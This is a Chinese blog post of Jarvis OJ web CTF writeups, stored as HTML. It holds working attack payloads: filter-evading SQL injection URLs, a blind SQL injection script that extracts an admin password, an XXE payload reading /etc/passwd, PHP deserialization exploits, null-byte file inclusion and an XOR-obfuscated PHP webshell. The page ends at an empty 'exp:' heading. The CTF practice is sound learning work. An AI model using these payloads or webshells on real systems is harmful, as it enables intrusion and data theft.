@@ -1,0 +1,784 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ 平台Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/04/18/Jarvis-OJ-平台Writeup/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description">
+<meta property="og:image" content="https://i.imgur.com/BBtJ5jU.jpg">
+<meta property="og:image" content="https://i.imgur.com/OBvOJGu.jpg">
+<meta property="og:image" content="https://i.imgur.com/f5ElEfb.jpg">
+<meta property="og:image" content="https://i.imgur.com/J79LpjD.jpg">
+<meta property="og:image" content="https://i.imgur.com/fiWfFwF.jpg">
+<meta property="og:image" content="https://i.imgur.com/DQbod7W.jpg">
+<meta property="og:image" content="https://i.imgur.com/5eYQhtq.jpg">
+<meta property="og:image" content="https://i.imgur.com/4oPelvT.jpg">
+<meta property="og:image" content="https://i.imgur.com/PbdeERE.jpg">
+<meta property="og:image" content="https://i.imgur.com/NTvKeHB.jpg">
+<meta property="og:image" content="https://i.imgur.com/UQuOfHw.jpg">
+<meta property="og:image" content="https://i.imgur.com/gdo8gy7.jpg">
+<meta property="og:image" content="https://i.imgur.com/35PVtUp.jpg">
+<meta property="og:image" content="https://i.imgur.com/Lvz3HO5.jpg">
+<meta property="og:image" content="https://i.imgur.com/df4X0wO.jpg">
+<meta property="og:image" content="https://i.imgur.com/ehJDN5q.jpg">
+<meta property="og:image" content="https://i.imgur.com/mgjvixo.jpg">
+<meta property="og:image" content="https://i.imgur.com/ehJDN5q.jpg">
+<meta property="og:image" content="https://i.imgur.com/wBu21FR.jpg">
+<meta property="og:image" content="https://i.imgur.com/BDvmFcV.jpg">
+<meta property="og:updated_time" content="2018-04-18T15:22:29.919Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jarvis OJ 平台Writeup">
+<meta name="twitter:description">
+<meta name="twitter:image" content="https://i.imgur.com/BBtJ5jU.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> Jarvis OJ 平台Writeup | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Jarvis OJ 平台Writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2018-04-18T23:21:40+08:00" content="2018-04-18">
+              2018-04-18
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/做CTF补充知识盲点/" itemprop="url" rel="index">
+                    <span itemprop="name">做CTF补充知识盲点</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2018/04/18/Jarvis-OJ-平台Writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/04/18/Jarvis-OJ-平台Writeup/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.imgur.com/BBtJ5jU.jpg" alt=""></p>
+<a id="more"></a>
+<h3 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h3><p>Please use port 51 to visit this site. </p>
+<p>curl –local-port 51<br>看来要好好了解一下curl其它参数</p>
+<p><img src="https://i.imgur.com/OBvOJGu.jpg" alt=""></p>
+<h3 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h3><p><code>localhost access only!!</code></p>
+<p> <code>X-FORWARDED-FOR: 127.0.0.1</code><br> <img src="https://i.imgur.com/f5ElEfb.jpg" alt=""></p>
+<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>有点没理解这题<br>提交ffifdyop获取flag</p>
+<p><a href="https://blog.csdn.net/greyfreedom/article/details/45846137" target="_blank" rel="external">https://blog.csdn.net/greyfreedom/article/details/45846137</a></p>
+<h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p> <img src="https://i.imgur.com/J79LpjD.jpg" alt=""></p>
+<p>文件包含, index.php转base64</p>
+<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>shield.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			$this -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($this-&gt;file) &amp;&amp; stripos($this-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos($this-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($this-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents($this-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>首先修改shield.php文件中的 $filename = ‘pctf.php’ 因为要计取这个文件，默认值并没有给</p>
+<p>exp.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$a = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>Payload:<br><code>http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</code></p>
+<p><img src="https://i.imgur.com/fiWfFwF.jpg" alt=""></p>
+<h3 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h3><p> 页面提示index.phps</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Payload:<br><code>http://web.jarvisoj.com:32780/index.php?id=0a&amp;a=php://input&amp;b=%0011111</code><br>POST:<code>1112 is a nice lab!</code></p>
+<p><img src="https://i.imgur.com/DQbod7W.jpg" alt="15226623056038"></p>
+<p>访问后<br>注入绕过,我发现没有content这个数据库看答案上面是有的，但是如何爆都爆不出来；<br><img src="https://i.imgur.com/5eYQhtq.jpg" alt="15226625057728"></p>
+<p>要这样:</p>
+<p><code>http://web.jarvisoj.com:32780//%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=database()</code></p>
+<p><code>http://web.jarvisoj.com:32780//%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/selselectect/*1*/1,2,group_concat%28column_name%29/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74</code></p>
+<p><code>http://web.jarvisoj.com:32780//%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/selselectect/*1*/1,2,context/*1*/frofromm/*1*/content</code><br><img src="https://i.imgur.com/4oPelvT.jpg" alt="15226625506732"></p>
+<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><p>装了几篇Windows、linux,MySQL都无法导入创建函数;</p>
+<p>参考链接：<br><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/" target="_blank" rel="external">https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/</a></p>
+<h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>学习资料：</p>
+<ul>
+<li><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">深入理解hash长度扩展攻击（sha1为例）</a></li>
+<li><a href="http://www.freebuf.com/articles/web/31756.html" target="_blank" rel="external">科普哈希长度扩展攻击(Hash Length Extension Attacks)</a></li>
+<li><a href="http://roo0.me/2017/07/01/WP-for-JarvisOJ/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C" target="_blank" rel="external">WP for JarvisOJ</a></li>
+</ul>
+<h3 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h3><p> <code>小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？</code></p>
+<p> 图片链接</p>
+<p> <code>http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code></p>
+<p><img src="https://i.imgur.com/PbdeERE.jpg" alt="15228107719355"></p>
+<p><img src="https://i.imgur.com/NTvKeHB.jpg" alt="15228107918585"></p>
+<p>后来看网上答案才得知这个好像挂了 无法再做这道题了</p>
+<p>访问后台:<br><code>http://web.jarvisoj.com:32782/proxy.php?url=http://103.27.76.153/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code></p>
+<p>通过扫描器知admin目录下有robots.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:trojan.php</span><br><span class="line">Disallow:trojan.php.txt</span><br></pre></td></tr></table></figure>
+<p>trojan.php.txt的内容是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;=(<span class="string">"!"</span>^<span class="string">"`"</span>).(<span class="string">"( "</span>^<span class="string">"&#123;"</span>).(<span class="string">"("</span>^<span class="string">"["</span>).(<span class="string">"~"</span>^<span class="string">";"</span>).(<span class="string">"|"</span>^<span class="string">"."</span>).(<span class="string">"*"</span>^<span class="string">"~"</span>);$&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;((<span class="string">"-"</span>^<span class="string">"H"</span>). (<span class="string">"]"</span>^<span class="string">"+"</span>). (<span class="string">"["</span>^<span class="string">":"</span>). (<span class="string">","</span>^<span class="string">"@"</span>). (<span class="string">"&#125;"</span>^<span class="string">"U"</span>). (<span class="string">"e"</span>^<span class="string">"A"</span>). (<span class="string">"("</span>^<span class="string">"w"</span>).(<span class="string">"j"</span>^<span class="string">":"</span>). (<span class="string">"i"</span>^<span class="string">"&amp;"</span>). (<span class="string">"#"</span>^<span class="string">"p"</span>). (<span class="string">"&gt;"</span>^<span class="string">"j"</span>). (<span class="string">"!"</span>^<span class="string">"z"</span>). (<span class="string">"T"</span>^<span class="string">"g"</span>). (<span class="string">"e"</span>^<span class="string">"S"</span>). (<span class="string">"_"</span>^<span class="string">"o"</span>). (<span class="string">"?"</span>^<span class="string">"b"</span>). (<span class="string">"]"</span>^<span class="string">"t"</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行后报错：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: assert() [<span class="function"><span class="keyword">function</span>.<span class="title">assert</span>]: <span class="title">Assertion</span> "<span class="title">eval</span><span class="params">($_POST[<span class="number">360</span>])</span>" <span class="title">failed</span> <span class="title">in</span> <span class="title">C</span>:\<span class="title">phpstudy</span>\<span class="title">WWW</span>\<span class="title">b</span>.<span class="title">php</span> <span class="title">on</span> <span class="title">line</span> 1</span></span><br></pre></td></tr></table></figure>
+<p><code>webshell密码为360</code><br>这张图片是网上找的,因为无法复现；<br><img src="https://i.imgur.com/UQuOfHw.jpg" alt="15228108951389"></p>
+<h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p><code>&quot;没有什么防护是一个漏洞解决不了的，如果有，那
+就.....
+&quot;</code></p>
+<p>上传带一句话木马:<br><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;c&#39;]);&lt;/script&gt;</code></p>
+<p>猜测得到图片路径<br><code>http://web.jarvisoj.com:32785/uploads/1522825874.jpg</code></p>
+<p>文件包含,<code>%00</code>截断:<br><code>http://web.jarvisoj.com:32785/index.php?page=./uploads/1522825874.jpg%00</code></p>
+<h3 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h3> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span> <span class="comment">#存放内容</span></span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32787/login.php"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># post包</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">	<span class="string">'password'</span>:<span class="string">'123456'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">charss = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> charss:</span><br><span class="line">		str_ascii = ord(j)</span><br><span class="line">		<span class="comment">#获取数据库名称  admin</span></span><br><span class="line">		<span class="comment">#payload = "admin'/**/and/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),&#123;0&#125;,1))&gt;&#123;1&#125;#".format(i,str_ascii)</span></span><br><span class="line">		<span class="comment">#获取admin中的表</span></span><br><span class="line">		<span class="comment">#payload = "admin'/**/and/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=0x61646D696E/**/limit/**/2,1),&#123;0&#125;,1))&gt;&#123;1&#125;#".format(i,str_ascii)</span></span><br><span class="line">		<span class="comment">#获取密码</span></span><br><span class="line">		payload = <span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;&#125;,1))&gt;&#123;&#125;#"</span>.format(i,str_ascii)</span><br><span class="line">		data[<span class="string">'username'</span>] = payload</span><br><span class="line">		req = requests.post(url=url,data=data)</span><br><span class="line">		length = len(req.text)</span><br><span class="line">		<span class="keyword">if</span> length &gt; <span class="number">1191</span>:</span><br><span class="line">			result += j</span><br><span class="line">			print(result)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	print(result)</span><br></pre></td></tr></table></figure>
+<h3 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h3><p><code>请设法获得目标机器/home/ctf/flag.txt中的flag值。</code></p>
+<p><img src="https://i.imgur.com/gdo8gy7.jpg" alt="15228264896120"></p>
+<p>以上是通过json格式提交数据;那么可以通过xml格式获取文件内容</p>
+<p>将<code>application/json</code>改成<code>application/xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/35PVtUp.jpg" alt="15228265518695"></p>
+<p>读文件:<br><img src="https://i.imgur.com/Lvz3HO5.jpg" alt="15228265870545"></p>
+<p>参考资料:</p>
+<ul>
+<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="external">XML实体注入攻击</a></li>
+</ul>
+<h3 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h3><p> 测试上上传图片.利用主别人的图片死活生成不了马 不知道哪个步骤错了;</p>
+<h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p>
+<table>
+<thead>
+<tr>
+<th>处理器</th>
+<th>对应的存储格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>php</td>
+<td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
+</tr>
+<tr>
+<td>php_serialize <br>(php&gt;=5.5.4)</td>
+<td>经过 serialize() 函数反序列处理的数组</td>
+</tr>
+</tbody>
+</table>
+<p>资料：</p>
+<ul>
+<li><a href="https://gist.github.com/chtg/f74965bfea764d9c9698#file-gistfile1-md" target="_blank" rel="external">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患 </a></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        $this-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>php.ini</code>中默认<code>session.serialize_handler</code>为<code>php_serialize</code>，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p>
+<p>exp：</p>
